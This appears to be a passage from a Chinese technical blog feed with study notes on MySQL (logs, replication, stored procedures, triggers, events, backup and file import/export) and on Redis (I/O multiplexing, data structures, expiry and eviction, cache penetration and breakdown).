UUID 比 INT 长得多，插入时不连续，会导致页分裂，写入效率低
占用索引空间大，影响性能
更推荐使用自增 ID 或雪花 ID 这类连续主键

为什么不推荐用 MyISAM？
没有事务，数据一多就容易出错
写入时锁整张表，根本不适合高并发
崩溃后可能数据恢复不了

除非是一些只读的临时表，基本没必要用 MyISAM。
InnoDB 表一定需要主键吗？InnoDB 表必须有主键。没有显式主键时，它会自动生成一个隐藏的 6 字节主键。但不能主动控制，所以建议明确设置主键。
日志系统这一部分专注讲解 MySQL（尤其是 InnoDB）中的日志系统，这是事务机制、高可用能力、崩溃恢复背后的核心支撑。日志是理解数据库“为什么不会轻易丢数据”的关键。

MySQL 有哪些类型的日志常见的日志类型有这几种，各有分工：

Redo Log（重做日志） — InnoDB 独有
Undo Log（回滚日志） — InnoDB 独有
Binlog（二进制日志） — MySQL 层日志，跟存储引擎无关
Error Log（错误日志） — 系统运行中产生的错误或启动信息
Slow Query Log（慢查询日志） — 查 SQL 是否“拖后腿”
General Log（通用日志） — 记录所有 SQL，默认关闭

其中最核心、最容易混淆的，是 Redo Log、Undo Log 和 Binlog。

Redo Log：保证数据持久化的关键作用：崩溃恢复
InnoDB 的写流程不是直接写磁盘，而是先写 Redo Log，再异步刷数据页到磁盘。这就叫 WAL（Write-Ahead Logging）机制。
流程如下：

修改数据页，写入内存（Buffer Pool）
同时写一份日志到 Redo Log（先写磁盘）
事务提交
后台再慢慢把数据刷回磁盘页（称为刷新脏页）

即使数据库宕机，只要 Redo Log 写成功，重启后可以重做操作，数据不丢。
Redo Log 有两个关键点：

逻辑结构：是按页（Page）为单位的物理日志
落盘控制：由 innodb_flush_log_at_trx_commit 控制

设置值解释：

1：每次事务提交都写入磁盘（最安全，默认）
2：写到操作系统缓存，不立即刷盘（性能略高）
0：每秒写一次，崩溃时可能丢事务（性能最高）


Undo Log：实现事务回滚和 MVCC 的基础作用：

回滚事务用的“反操作日志”
实现多版本并发控制（MVCC）

Undo Log 记录每一次数据修改前的“旧值”，如果事务执行失败或显式回滚，就可以用 Undo Log 把数据恢复回来。
另外，读取操作也依赖 Undo Log，才能实现“事务看到的是自己那一刻的数据快照”。

Binlog：主从同步的关键机制作用：

支撑主从复制
做数据恢复时能用
不依赖存储引擎（MyISAM、InnoDB 都会写）

Binlog 记录的是逻辑操作，比如“插入了这条数据”，不关心页或物理地址。
常见格式：

STATEMENT：记录原始 SQL，可能出现副作用（比如 NOW() 每次值都不一样）
ROW：记录数据行变化，更安全但日志更大
MIXED：两者结合，MySQL 默认设置

查看格式：
SHOW VARIABLES LIKE &#x27;binlog_format&#x27;;

主从同步就是靠 Binlog 实现的，主库写入操作会记录在 Binlog 中，从库会不断读取并重放这些日志。

Redo 和 Binlog 的协作逻辑InnoDB 的事务提交涉及两个系统：

Redo Log（物理日志）负责恢复
Binlog（逻辑日志）负责同步

为保证两边一致性，MySQL 引入了 两阶段提交机制：

写入 Binlog
写入 Redo Log，并提交事务

只有两者都写成功，事务才算真正提交。如果中途失败，MySQL 启动后会自动判断是否需要回滚或补交。

主从复制与高可用架构设计什么是主从复制主从复制（Replication）指的是：一个主库负责写，从库负责读，主库的数据变动通过日志传给从库，从库再“照着抄”。
这样能达到：

分担读请求压力
提升系统可用性（主库挂了还有从库）
实现备份、归档、读写分离等目的


主从复制的核心流程复制分为三步：

主库写 Binlog
从库 IO 线程拉 Binlog
从库 SQL 线程执行 Binlog 中的操作

这个过程叫 异步复制，意味着主库写完就完事，不等从库是否同步完。
也有半同步、全同步等模式，但需要额外配置插件或高版本支持。

复制方式有哪些？MySQL 支持三种复制格式，对应 Binlog 的格式：
1. Statement-based（SBR）
复制原始 SQL 语句
简洁，但可能出现不一致（如非确定性函数）

2. Row-based（RBR）
复制每行数据变动（如主键 id 从 1 变成 2）
最精确，也最耗资源

3. Mixed-based（MBR）
混合使用，根据情况选择 SBR 或 RBR
是 MySQL 默认推荐方式

查看当前设置：
SHOW VARIABLES LIKE &#x27;binlog_format&#x27;;


设置主从的基本流程以下是 MySQL 主从复制的基础步骤（简化）：

主库开启 Binlog，并设置唯一 server-id

[mysqld]server-id=1log-bin=mysql-bin


从库设置不同的 server-id

[mysqld]server-id=2


在主库创建复制账号：

CREATE USER &#x27;repl&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;;GRANT REPLICATION SLAVE ON *.* TO &#x27;repl&#x27;@&#x27;%&#x27;;


从库指定主库信息：

CHANGE MASTER TO  MASTER_HOST=&#x27;主库IP&#x27;,  MASTER_USER=&#x27;repl&#x27;,  MASTER_password: &#x27;********&#x27;  MASTER_LOG_FILE=&#x27;mysql-bin.000001&#x27;,  MASTER_LOG_POS=123;START SLAVE;


检查状态：

SHOW SLAVE STATUS\G


高可用架构的常见方式单主多从 + 读写分离
写操作集中在主库
读操作分发到多个从库
可以通过中间件实现（如 MyCat、ProxySQL、Atlas）

MGR（Group Replication）MySQL 官方推出的高可用方案，支持自动主从切换，事务强一致性，适合对数据同步非常敏感的业务。
双主复制（主主）
两个节点互为主从
可实现多点写入
需要特别小心数据冲突（如自增主键）


故障切换方案设计手动切换（最常见）
运维通过监控发现主库异常
提升一个从库为主库
改变业务的连接配置

自动切换
借助高可用组件如 MHA（MySQL High Availability）
或 Kubernetes + StatefulSet 做自动恢复

自动化虽好，但也增加了复杂度和运维成本。

主从延迟的问题从库复制是异步的，因此可能会出现延迟。表现为：

主库刚写完数据，从库查不到
某些业务逻辑依赖写后读就会出问题（比如下单后立即查订单）

解决方案：

用读写分离中间件支持“读主”策略
或在必要时手动读主库（比如订单类逻辑）

查看延迟时间：
SHOW SLAVE STATUS\G-- 关注 Seconds_Behind_Master 字段


常见问题汇总为什么主从会出现不一致？
主库用了不确定函数（如 RAND(), UUID(), NOW()）
手动修改了从库数据
使用了 SBR 格式但 SQL 语义不稳定

建议使用 ROW 格式可避免多数问题。
如何避免主键冲突双主架构下可能有主键冲突，这时可以使用奇偶数或步长策略，例如：
auto_increment_increment=2auto_increment_offset=1  -- 主库1auto_increment_offset=2  -- 主库2

从库宕机后还能追上吗能。只要主库的 Binlog 还在，从库恢复后可继续同步。如果 Binlog 被清理，就需要重新做一次全量 + 增量同步。

读写分离MySQL 原生并不会自动把读请求分发到从库，它只是提供了主从复制的能力，读写分离是要自己做的，通常通过以下3种方式实现。
1. 应用层手动分发
最常见也最灵活的做法，在业务代码中写明哪些操作走主库、哪些走从库。
例如：

查询类接口走从库连接池
写操作（新增、更新、删除）走主库连接池

优点：

可控、灵活、便于定制（比如特定查询强制走主）

缺点：

应用逻辑复杂度变高
容易出现开发遗漏，导致数据不一致问题


2. 中间件代理
借助数据库中间件实现自动的读写分离路由：

MyCat
ShardingSphere-Proxy
ProxySQL
Atlas（美团开源）

它们的作用是作为“数据库代理层”，接收 SQL 请求，根据 SQL 类型自动判断读写，转发给主库或从库。
优点：

与业务代码无耦合
具备连接池、负载均衡等能力

缺点：

配置复杂度略高
性能取决于中间件本身


3. 数据库驱动层支持（少见）
部分语言的数据库驱动或 ORM 框架支持配置多个数据源，并自动根据查询类型路由。
如：

Spring Boot + MyBatis 可以配置多数据源
Laravel、Django 等也可以通过插件方式实现读写分离

不过这种方案本质上还是靠“程序逻辑”判断，没有数据库层的智能调度。
延迟感知问题
读写分离时还需要考虑 主从延迟：

如果写完订单立刻查详情，查的是从库，可能还没同步到
可能导致“刚写入就查不到”的现象

常见做法：

核心流程强制读主（如订单&#x2F;支付&#x2F;登录）
异步操作或非关键接口放宽一致性要求


存储过程什么是存储过程？存储过程就是：
一段事先定义好、存储在数据库中的 SQL 代码，可以像函数一样被调用。
常用于：

封装复杂的业务逻辑（如多表联合处理）
实现一些批量处理任务
降低客户端与数据库之间的通信成本

写一次，可以在多个地方复用，还能避免把复杂 SQL 写死在业务代码中。

创建存储过程的基本语法DELIMITER //CREATE PROCEDURE proc_example()BEGIN  SELECT NOW();END //DELIMITER ;

解释说明：

DELIMITER // 是为了避免 ; 被误当成语句结束符
BEGIN ... END 包裹逻辑体
proc_example 是过程名，可被调用

调用方式：
CALL proc_example();


参数类型支持存储过程支持 3 种参数类型：

IN：传入参数（默认）
OUT：返回结果用
INOUT：传入传出都可以

示例：
CREATE PROCEDURE greet_user(IN username VARCHAR(50))BEGIN  SELECT CONCAT(&#x27;Hello, &#x27;, username);END;

带返回值的例子：
CREATE PROCEDURE double_value(IN input INT, OUT result INT)BEGIN  SET result = input * 2;END;-- 调用方式（MySQL 变量用 @）CALL double_value(5, @res);SELECT @res;


存储过程里的控制语句可以像写程序一样控制流程：

条件判断：IF ... THEN ... ELSE ... END IF
循环：WHILE、LOOP、REPEAT
局部变量：DECLARE

示例：
CREATE PROCEDURE loop_counter()BEGIN  DECLARE i INT DEFAULT 1;  WHILE i &lt;= 5 DO    SELECT CONCAT(&#x27;Loop &#x27;, i);    SET i = i + 1;  END WHILE;END;


查看与删除存储过程查看已有存储过程：
SHOW PROCEDURE STATUS WHERE Db = &#x27;数据库名&#x27;;

查看具体定义：
SHOW CREATE PROCEDURE proc_name;

删除存储过程：
DROP PROCEDURE IF EXISTS proc_name;


使用存储过程的优缺点优点：
提高代码复用性，避免重复 SQL
执行速度快（预编译）
减少应用与数据库的通信频率

缺点：
可维护性较差（逻辑隐藏在数据库里）
不利于版本控制（部署升级不方便）
调试不如应用层灵活
写法偏 SQL 风格，不如高级语言易写易读


适合使用存储过程的场景
批量导入导出
数据迁移、归档
报表类查询逻辑封装
和第三方数据库集成时对外暴露“数据库接口”


触发器一种 基于事件驱动 的数据库对象，当指定表发生某些操作（如插入、更新、删除）时，会自动执行事先定义好的 SQL 逻辑，无需应用显式调用。
简单说，就是数据库自带的“监听器”。

触发器适合用在哪？常见场景：

数据变动时自动记录日志
自动补充派生字段（如更新订单状态时同步更新时间）
做数据校验或限制（虽然现在推荐在应用层做）
简单的数据同步（如将数据同时写入两张表）


支持哪些事件类型MySQL 支持 6 类触发事件：



触发时机
操作类型



BEFORE
INSERT、UPDATE、DELETE


AFTER
INSERT、UPDATE、DELETE


注意：每个表、每个操作类型、每个时机 只能创建一个触发器。例如：一张表只能有一个 AFTER INSERT 触发器。

创建触发器的语法DELIMITER //CREATE TRIGGER trg_after_insert_userAFTER INSERT ON usersFOR EACH ROWBEGIN  INSERT INTO user_logs(user_id, action, created_at)  VALUES (NEW.id, &#x27;insert&#x27;, NOW());END //DELIMITER ;

说明：

AFTER INSERT ON users 表示在 users 表插入数据后触发
FOR EACH ROW 表示每插入一行就执行一次
NEW 代表新数据，OLD 代表旧数据（适用于 UPDATE 和 DELETE）


示例：UPDATE 时记录变更CREATE TRIGGER trg_before_update_userBEFORE UPDATE ON usersFOR EACH ROWBEGIN  INSERT INTO user_logs(user_id, action, old_name, new_name, changed_at)  VALUES (    OLD.id,    &#x27;update&#x27;,    OLD.name,    NEW.name,    NOW()  );END;

在用户信息更新之前，自动把名字变更记录保存到 user_logs。

删除和查看触发器查看触发器：
SHOW TRIGGERS;

查看某个触发器定义：
SHOW CREATE TRIGGER trg_name;

删除触发器：
DROP TRIGGER IF EXISTS trg_name;


常见问题与限制是否支持修改触发器？不支持 ALTER TRIGGER，只能 DROP 再 CREATE。
是否支持事务？触发器执行是在事务中完成的。如果主操作回滚，触发器执行的内容也会被回滚。
是否能在触发器中调用存储过程？可以调用，但建议避免太复杂的逻辑，防止性能问题或死锁。
是否支持对视图使用触发器？不支持，触发器只能应用在 基表 上，不能绑定到视图或临时表。
是否可以控制触发顺序？不可以。MySQL 不支持同一类事件的多个触发器（不像 Oracle &#x2F; PostgreSQL 那样可以定义多个并排序）。

使用触发器的建议
尽量保持触发逻辑简单、快速
加入异常处理，防止触发器失败导致主操作失败
避免级联触发（一个触发器再触发另一个），否则调试困难
用于审计日志、数据归档 是较好的应用场景


事件调度器事件调度器（Event Scheduler）是一种 MySQL 内置的 定时执行 SQL 语句 的机制，可以在指定时间点或时间间隔自动运行某段 SQL，不依赖外部应用或操作系统。
它有点像数据库版本的 crontab，但是写在数据库里的。

使用事件调度器的前提：先开启它默认可能是关闭状态，可以通过以下方式开启：
查看当前状态SHOW VARIABLES LIKE &#x27;event_scheduler&#x27;;

如果返回 OFF，说明没开。
启用方式（临时）SET GLOBAL event_scheduler = ON;

启用方式（永久）在配置文件（如 my.cnf）中添加：
event_scheduler = ON


创建事件的基本语法CREATE EVENT IF NOT EXISTS event_clear_logsON SCHEDULE EVERY 1 DAYSTARTS CURRENT_TIMESTAMP + INTERVAL 1 HOURDO  DELETE FROM user_logs WHERE created_at &lt; NOW() - INTERVAL 30 DAY;

解释：

ON SCHEDULE EVERY 1 DAY：每 1 天执行一次
STARTS 指定起始时间（可选）
DO 后面是要执行的 SQL 语句

这条语句的作用是：每天清理一次 30 天前的日志。

常用的调度方式1. 每隔固定时间执行一次ON SCHEDULE EVERY 10 MINUTE

2. 固定时间点执行一次（只执行一次）ON SCHEDULE AT TIMESTAMP &#x27;2025-04-11 00:00:00&#x27;

3. 设置结束时间（任务失效）ENDS CURRENT_TIMESTAMP + INTERVAL 30 DAY


启用、禁用和删除事件启用事件（默认创建时是 ENABLED）ALTER EVENT event_clear_logs ENABLE;

禁用事件ALTER EVENT event_clear_logs DISABLE;

删除事件DROP EVENT IF EXISTS event_clear_logs;


示例：每小时检查超时订单并更新状态CREATE EVENT check_timeout_ordersON SCHEDULE EVERY 1 HOURDO  UPDATE orders  SET status = &#x27;expired&#x27;  WHERE status = &#x27;pending&#x27; AND created_at &lt; NOW() - INTERVAL 2 HOUR;


事件调度器适合哪些任务？
自动清理过期数据
定时归档、备份表数据
批量状态更新（如标记过期订单、失效优惠券）
生成日报、统计表数据等


备份恢复mysqldump 是 MySQL 提供的一个命令行工具，用于备份 MySQL 数据库的内容。它可以导出数据库中的表、数据和结构，并生成 SQL 脚本，可以用于恢复数据或迁移数据。下面是常见的 mysqldump 使用方法。
备份mysqldump -u 用户名 -p 数据库名 &gt; 备份文件.sql

其中：

-u：指定 MySQL 用户名。
-p：提示输入密码（密码不需要在命令中直接输入，-p 后不接密码，执行后会提示你输入密码）。
数据库名：要备份的数据库名称。
备份文件.sql：备份文件保存的路径和文件名。

备份单个数据库
mysqldump -u root -p my_database &gt; my_database_backup.sql

这条命令将备份名为 my_database 的数据库，备份文件保存为 my_database_backup.sql。
备份多个数据库
mysqldump -u root -p --databases db1 db2 db3 &gt; backup.sql

此命令将备份 db1、db2 和 db3 这三个数据库，备份数据会合并到 backup.sql 中。
备份所有数据库
mysqldump -u root -p --all-databases &gt; all_databases_backup.sql

此命令备份所有 MySQL 数据库。
只备份数据库结构（不包含数据）
mysqldump -u root -p -d my_database &gt; my_database_structure.sql

-d 选项表示只备份数据库的结构（表结构、视图、存储过程等），不备份数据。

备份某个表
mysqldump -u root -p my_database my_table &gt; my_table_backup.sql

此命令将备份 my_database 数据库中的 my_table 表。

包含触发器和事件
mysqldump -u root -p --routines --triggers --events my_database &gt; my_database_with_triggers.sql

使用 --routines、--triggers 和 --events 选项可以将触发器、存储过程&#x2F;函数以及事件一起备份。

压缩备份文件
mysqldump -u root -p my_database | gzip &gt; my_database_backup.sql.gz

这条命令将备份数据压缩成 .gz 格式，以节省磁盘空间。
恢复使用 mysqldump 导出的 SQL 文件可以通过 mysql 命令来恢复：
mysql -u 用户名 -p 数据库名 &lt; 备份文件.sql

例如，恢复 my_database_backup.sql 文件到数据库 my_database：
mysql -u root -p my_database &lt; my_database_backup.sql

其他常用选项
--no-tablespaces：避免导出表空间信息。
--single-transaction：确保导出时不锁表，适用于 InnoDB 存储引擎。
--quick：在导出大数据时，逐行读取数据，避免内存消耗过多。

与文件系统交互MySQL 可以与文件系统进行交互，但能力是有限的，且带有一定安全风险。主要支持的交互方式包括：

读文件（如导入 CSV、读取文本）
写文件（如导出查询结果、写日志）


常见文件操作方式从文件读取数据（导入）使用 LOAD DATA INFILE 读取文本文件的数据插入表中：
LOAD DATA INFILE &#x27;/path/to/data.csv&#x27;INTO TABLE my_tableFIELDS TERMINATED BY &#x27;,&#x27;ENCLOSED BY &#x27;&quot;&#x27;LINES TERMINATED BY &#x27;\n&#x27;IGNORE 1 LINES;

说明：

支持读取 CSV、TSV 等纯文本格式
需要文件在 数据库服务器本地磁盘
需要开启 local_infile 选项（否则报错）

查看配置：
SHOW VARIABLES LIKE &#x27;local_infile&#x27;;

启用：
SET GLOBAL local_infile = 1;

将查询结果写入文件（导出）SELECT * FROM usersINTO OUTFILE &#x27;/tmp/users_export.csv&#x27;FIELDS TERMINATED BY &#x27;,&#x27;ENCLOSED BY &#x27;&quot;&#x27;LINES TERMINATED BY &#x27;\n&#x27;;

限制：

路径必须是 服务器上的绝对路径
目标文件 不能存在（否则报错）
MySQL 进程必须有权限写入该路径


安全性限制说明出于安全考虑，MySQL 默认限制了文件操作能力：

只能操作服务器本地文件
INTO OUTFILE 不能覆盖已存在的文件
不支持写入任意目录，通常只能在 secure_file_priv 设置的路径中写

查看该路径：
SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;;

如果结果是某个目录，只能在这个目录内进行读写操作。
如果是空字符串，表示可访问任意路径（不推荐）
如果是 NULL，表示完全禁用了文件导入导出。

用于日志或文本处理的函数MySQL 不支持动态操作文件系统，比如：

不支持列出目录文件
不支持创建文件、移动文件
也不能直接在 SQL 中写系统命令

但可以通过函数处理文本内容：

LOAD_FILE(&#39;/path/to/file.txt&#39;)：可以将服务器上的文本文件内容读入，返回字符串
仅在 secure_file_priv 设置允许的路径下可用

示例：
SELECT LOAD_FILE(&#x27;/var/lib/mysql-files/notes.txt&#x27;);

返回文件的全部文本内容（适合读配置、静态文本）。

]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis</title>
    <url>/2025/04/03/Redis/</url>
    <content><![CDATA[I&#x2F;O多路复用是什么I&#x2F;O 多路复用（I&#x2F;O Multiplexing）是一种使得单个线程（或进程）能够同时监控多个 I&#x2F;O 操作的技术，它可以让程序有效地处理多个 I&#x2F;O 操作（如读取文件或网络连接）而无需为每个操作创建一个独立的线程或进程。I&#x2F;O 多路复用的核心思想是在一个线程内，能够同时处理多个 I&#x2F;O 操作，避免了频繁的线程切换和进程创建，从而提高了系统的性能和资源利用率。
在没有 I&#x2F;O 多路复用机制的情况下，当程序需要等待多个 I&#x2F;O 操作时（比如等待多个网络连接的读取操作），通常会采取阻塞方式，直到每个操作完成。这样每个操作都会阻塞当前线程，导致系统资源浪费。I&#x2F;O 多路复用通过在一个线程内同时监听多个 I&#x2F;O 操作，使得线程在等待 I&#x2F;O 操作完成时可以继续做其他工作。
I&#x2F;O 多路复用的工作原理I&#x2F;O 多路复用的基本原理是，程序通过一个系统调用（如 select、poll、epoll 等）将多个文件描述符注册到内核中，内核在这些文件描述符上的 I&#x2F;O 事件发生时通知程序。程序通过查询这些文件描述符的状态，确定哪些可以进行读写操作。
具体流程如下：

注册文件描述符：应用程序通过某种方式（如 select、poll、epoll 等）将需要监控的文件描述符注册到操作系统内核。
等待 I&#x2F;O 事件：应用程序进入等待状态，等待内核通知哪些文件描述符有事件（例如数据可读、可写或异常）。
事件发生时处理 I&#x2F;O 操作：一旦某个文件描述符有 I&#x2F;O 事件发生，内核会通知程序，程序可以读取或写入数据，或处理相应的 I&#x2F;O 操作。
重复等待：程序处理完事件后，继续进入等待状态，直到下一个事件发生。

为什么需要 I&#x2F;O 多路复用？I&#x2F;O 多路复用的目标是提高并发性和系统性能，尤其是在以下几种场景下：

高并发：当需要同时处理大量 I&#x2F;O 操作（比如网络请求、文件操作等）时，创建一个线程或进程来处理每个请求可能会消耗大量系统资源，而 I&#x2F;O 多路复用通过共享一个线程来处理多个 I&#x2F;O 操作，大大减少了资源消耗。
减少阻塞：传统的 I&#x2F;O 操作通常是阻塞的，程序会一直等待 I&#x2F;O 操作完成，直到可以读取或写入数据。而 I&#x2F;O 多路复用使得程序在等待 I&#x2F;O 操作时不会被阻塞，可以同时处理多个 I&#x2F;O 请求，提高效率。
资源节省：通过单线程处理多个 I&#x2F;O 操作，可以避免过多的线程或进程创建，从而节省系统资源，减少上下文切换的开销。

I&#x2F;O 多路复用的典型技术I&#x2F;O 多路复用的实现方式依赖于操作系统提供的系统调用，常见的实现技术包括：

**select**：
最早期的 I&#x2F;O 多路复用机制，允许程序监控多个文件描述符，判断哪些文件描述符已经准备好进行读写操作。
select 通过传递文件描述符集合来实现，每次调用都会检查所有文件描述符的状态，因此在大量文件描述符的情况下性能会变差。
受限于文件描述符数量（通常是 1024）。


**poll**：
类似于 select，但解决了 select 的一些局限，比如文件描述符数量的限制。
poll 使用一个数组来存储文件描述符和事件，能处理任意数量的文件描述符，但性能仍然随着文件描述符数量的增加而降低。


**epoll**：
Linux 下提供的高效 I&#x2F;O 多路复用机制，特别适用于处理大量并发连接。
epoll 使用事件驱动的方式，只关注那些发生事件的文件描述符，避免了不必要的检查和遍历，从而提高了性能。
支持边缘触发（ET）和水平触发（LT）模式，能够更精确地控制 I&#x2F;O 事件。
epoll 有两种工作模式：


水平触发（Level Triggered，LT）：
当某个文件描述符有数据可读时，epoll 会通知用户程序。如果程序没有读走所有数据，它会继续通知直到数据被完全读取。


边缘触发（Edge Triggered，ET）：
当某个文件描述符的状态从不可读变为可读时，epoll 会通知用户程序。只有当文件描述符的状态发生变化时，epoll 才会触发通知。相比于 LT 模式，ET 模式需要程序更精细地处理数据。




**kqueue**（在 BSD 系统中）：
类似于 epoll，是 BSD 系统（如 macOS）中的 I&#x2F;O 多路复用机制。kqueue 能高效地监控多个 I&#x2F;O 事件，支持灵活的事件处理机制。



I&#x2F;O 多路复用的优缺点优点
高并发处理：在单线程或少量线程中处理多个 I&#x2F;O 操作，避免了线程和进程切换的开销，能处理更多的并发请求。
节省资源：减少了线程和进程的创建和销毁，避免了过多的资源消耗。
避免阻塞：通过非阻塞的 I&#x2F;O 操作，程序能够在等待数据时继续执行其他任务，提升系统响应能力。

缺点
实现复杂：相比传统的阻塞式 I&#x2F;O，I&#x2F;O 多路复用需要处理更多的复杂性，如事件的管理和响应。
适用场景有限：虽然 I&#x2F;O 多路复用适用于高并发场景，但它对于一些不需要处理大量并发的简单应用来说可能过于复杂。
系统依赖性：不同操作系统提供的 I&#x2F;O 多路复用机制（如 select、poll、epoll）有差异，可能需要考虑跨平台的适配问题。


redis都有哪些数据结构Redis 提供了多种数据结构，旨在帮助开发者高效地存储和操作不同类型的数据。每种数据结构在 Redis 中都扮演着不同的角色，针对特定的应用场景进行优化。以下是 Redis 支持的主要数据结构：
1. String（字符串）
描述：Redis 中的基本数据类型，可以存储任何类型的字符串，包括数字、文本、二进制数据等。
特点：
每个键值对中的值都是一个字符串，最大长度为 512 MB。
支持常见的字符串操作，如设置、获取、拼接、截取等。
用途广泛，适合存储缓存、会话信息、计数器等。


常见操作：
SET key value：设置键值对。
GET key：获取键对应的值。
INCR key：对值进行加 1 操作（计数器）。



2. List（列表）
描述：一个简单的字符串列表，按照插入顺序排序，可以在列表的两端进行推送、弹出等操作。
特点：
支持从左侧或右侧操作（即双端队列）。
适合队列、栈等数据模型。
支持基于索引的访问和范围查询。


常见操作：
LPUSH key value：将值推入列表的左端。
RPUSH key value：将值推入列表的右端。
LPOP key：从左侧弹出一个元素。
RPOP key：从右侧弹出一个元素。
LRANGE key start stop：返回列表指定范围内的元素。



3. Set（集合）
描述：无序的字符串集合，集合中的元素是唯一的，没有重复值。
特点：
支持集合操作，如交集、并集和差集等。
适合用来存储不允许重复的数据。
常用于标签、集合运算等。


常见操作：
SADD key member：将成员添加到集合中。
SREM key member：移除集合中的成员。
SMEMBERS key：返回集合中的所有成员。
SINTER key1 key2：返回两个集合的交集。



4. Sorted Set（有序集合）
描述：与 Set 类似，但每个元素都有一个分数（score），根据分数进行排序。
特点：
元素按照分数从小到大排序，且分数相同的元素会按照插入顺序排序。
支持范围查询，可以根据分数范围进行查询，适用于排行榜、延迟队列等场景。


常见操作：
ZADD key score member：将元素及其分数添加到有序集合中。
ZRANGE key start stop：返回指定区间内的元素。
ZREM key member：移除有序集合中的成员。
ZRANK key member：返回成员的排名。



5. Hash（哈希）
描述：键值对集合，适合存储对象类型的数据。哈希可以通过字段（field）来存储多个值。
特点：
每个哈希可以包含多个字段和相应的值，类似于一个对象或记录。
适合存储多个关联字段的数据（例如，用户信息）。


常见操作：
HSET key field value：为哈希添加一个字段和值。
HGET key field：获取哈希中指定字段的值。
HGETALL key：获取哈希中的所有字段和值。
HDEL key field：删除哈希中的指定字段。



6. Bitmaps（位图）
描述：位图是对字符串类型的一种扩展，可以将字符串的每一位作为一个独立的 bit（0 或 1）来使用。
特点：
适用于高效的布尔值集合操作，比如用户是否参与活动。
可以在不需要额外内存的情况下存储大量的布尔值。


常见操作：
SETBIT key offset value：在指定位置设置位值。
GETBIT key offset：获取指定位置的位值。
BITCOUNT key：统计指定键中为 1 的位数。



9. Streams（流）
描述：Redis Streams 是一个类似消息队列的数据结构，用于存储和处理消息流。
特点：
支持按时间戳存储消息，并支持消费者组（Consumer Groups）。
可用于构建类似 Kafka 的消息队列系统。


常见操作：
XADD key * field value：向流中添加一条消息。
XREAD：从流中读取消息。
XGROUP CREATE：创建消费者组。



总结Redis 提供了非常丰富和高效的数据结构，适用于各种不同的使用场景。根据不同的需求，你可以选择合适的数据结构来存储和处理数据：

String：适用于缓存、计数器等简单数据。
List：适合队列、栈等线性数据。
Set：用于去重、集合操作等。
Sorted Set：适合排行榜、延迟队列等按顺序操作的数据。
Hash：适合存储对象或多字段的数据。
Bitmaps：适用于位级操作。
Streams：适用于消息队列等场景。

这些数据结构可以帮助开发者根据实际需求进行灵活的设计与优化，使得 Redis 成为一个非常强大的数据存储系统。



类型
特点
场景



String
快速简单，最大512MB
缓存单值、计数器、Token


Hash
结构体对象存储
用户信息、配置项


List
有序双向链表
消息队列、日志


Set
无序唯一集合
去重、标签、集合运算


ZSet
有序集合，带权重
排行榜、延迟队列



Redis 是单线程的，为什么还能这么快？单线程不是慢吗？
所有数据在内存中，访问没有磁盘 IO
单线程模型，避免上下文切换和加锁开销
基于 epoll 的 IO 多路复用，处理高并发连接
简单高效的数据结构（C实现 + ziplist&#x2F;intset优化）


Redis的过期机制和内存淘汰策略一、Key 的过期机制（TTL）Redis 支持设置每个 key 的过期时间，到时间后自动删除。
🔹设置过期时间的命令SET user:1 &quot;Tom&quot; EX 60     # 设置 60 秒后过期EXPIRE user:1 60           # 单独设置过期时间TTL user:1                 # 查询剩余时间

Redis 什么时候删除这些 key？重点：不是精确时钟删除，而是惰性 + 定期删除机制组合
删除策略详解
惰性删除（Lazy）
客户端访问 key 时，Redis 发现已过期，就立刻删掉（并返回 nil）


定期删除（主动扫描）
每 100ms，Redis 会随机抽样一批带过期时间的 key，删除过期的
如果发现超 25% 的 key 都过期了，就加快扫描节奏



为什么不逐个精准定时删除？会造成高 CPU 负载，扫描量大，Redis 单线程承受不住

二、内存淘汰机制（Memory Eviction）当 Redis 达到设置的最大内存（maxmemory），又需要写入新 key 时，会触发淘汰机制。
# 配置示例maxmemory 512mbmaxmemory-policy allkeys-lru


常见的内存淘汰策略


策略名
含义
推荐使用场景



noeviction
默认值，不淘汰，写入时报错
不建议线上使用


volatile-lru
从有过期时间的 key 中淘汰最少使用的
有效控制热数据内存


allkeys-lru
所有 key 中淘汰最少使用的
推荐：缓存场景


volatile-ttl
从有过期时间的 key 中淘汰快过期的
延迟淘汰控制


allkeys-random
所有 key 中随机淘汰
一般用作测试


volatile-random
有过期时间的 key 中随机淘汰
比较少用



Redis 设置了 maxmemory 和淘汰策略，为什么还是 OOM 了？
设置的是 noeviction，没有开启淘汰功能
有大量 key 没设置 TTL，策略是 volatile-*，Redis 找不到 key 可以淘汰
有大 key（bigkey），触发淘汰时清理不及时
写入速度远超淘汰速度（高并发写入 + 单线程处理）


实战建议


建议
理由



key 必须设置 TTL
防止缓存雪崩，内存泄露


建议使用 allkeys-lru
更加自动化地控制内存


避免存大 key（如超大 hash、list）
淘汰慢、容易卡主线程


监控 Redis 内存使用
用 INFO MEMORY 或 redis_exporter 上 Prometheus 监控



自问自答
Redis 的过期 key 是怎么删除的？是实时的吗？ 不是实时的， 惰性+定期
Redis 的惰性删除和定期删除分别是什么？ 
Redis 的内存淘汰策略有哪些？哪个最常用？
如果写入大量 key，但内存没满 Redis 就挂了，可能的原因有哪些？ 有设置最大内存， 或者是过多内存碎片，  或者是有写入大key，导致CPU撑不住卡主进程了…..
项目中怎么控制 Redis 占用内存？  设置**maxmemory**、内存回收策略、过期时间控制


缓存穿透、缓存击穿、缓存雪崩缓存穿透问题描述客户端频繁请求数据库中根本不存在的 key，由于缓存 miss，Redis 不命中，所有请求都落到底层数据库，造成数据库压力激增，甚至打挂。
典型场景请求不存在的用户 ID，比如 GET user:-1，Redis miss，数据库 miss，不断重复请求。
解决方案
缓存空值
对于数据库返回 null 的数据，也缓存一个标记，例如：user:-1 =&gt; &quot;null&quot;，设置较短过期时间。


布隆过滤器（BloomFilter）
在 Redis 之前做一层布隆过滤器，用于快速判断 key 是否存在，避免无意义请求。


接口参数校验
提前在 API 层做参数合法性校验，比如 ID 必须 &gt; 0。




缓存击穿问题描述一个热点 key 恰好过期，大量并发请求在这个瞬间同时打到数据库，造成数据库压力瞬时激增。
典型场景某商品详情是热点，每秒几千请求，刚好 GET product:123 在某个时刻过期，所有请求瞬间穿透。
解决方案
互斥锁（分布式锁）
第一个请求获取锁去加载数据，其它请求等待或短时间返回旧数据。


永不过期 + 异步刷新
不设置过期时间，而是定时刷新缓存（通过定时任务或消息队列）。


合理设置过期时间 + 提前异步预热
对热点 key 使用更长过期时间，或者在过期前预热。




